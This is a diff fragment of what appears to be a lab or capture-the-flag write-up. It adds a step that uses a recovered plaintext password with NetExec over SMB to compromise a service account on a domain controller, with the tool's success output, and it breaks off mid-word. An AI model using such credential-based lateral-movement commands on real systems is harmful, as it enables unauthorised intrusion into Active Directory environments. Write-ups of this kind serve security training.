@@ -704,4 +704,14 @@ WorkingDirectory :
 evil-winrm-py PS C:\Program Files (x86)\DCsecure>
 ```
 
-Ill que
+Ill query it further and get the password for the account
+
+# Compromising `svc_dcsecure_agent`
+
+```python
+nxc smb dc01.trask.hsm -u svc_dcsecure_agent -p 'DCiZS3CureD1982#' -k                     
+SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\svc_dcsecure_agent:DCiZS3CureD1982# 
+```
+
+This user is now compromi
